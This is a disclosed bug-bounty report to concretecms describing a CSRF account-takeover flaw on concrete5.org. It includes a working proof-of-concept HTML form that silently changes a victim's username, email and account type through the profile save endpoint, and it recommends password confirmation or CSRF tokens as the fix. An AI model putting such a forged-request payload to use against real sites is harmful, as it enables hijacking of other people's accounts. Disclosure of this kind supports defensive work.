# CSRF Full Account Takeover

## Report Details
- **Report ID**: 152052
- **URL**: https://hackerone.com/reports/152052
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-07-18T13:08:36.259Z
- **Disclosed**: 2016-08-12T22:02:46.488Z

## Reporter
- **Username**: khalidamin
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: concretecms

## Vulnerability Information
Try this code in your browser:

<html>
  <body>
    <form action="https://www.concrete5.org/profile/preferences/-/save/" method="POST">
      <input type="hidden" name="uName" value="██████" />
      <input type="hidden" name="uEmail" value="████" />
      <input type="hidden" name="uAccountType" value="owner" />
      <input type="hidden" name="profile&#95;private&#95;messages&#95;notification&#95;enabled" value="1" />
      <input type="hidden" name="uPasswordOld" value="" />
      <input type="hidden" name="uPasswordNew" value="" />
      <input type="hidden" name="uPasswordNewConfirm" value="" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

You need to ask for confirming password for changing settings, or use a token everytime it is changed.

If any further information is needed, plase ask.

Thanks.


## Attachments
No attachments
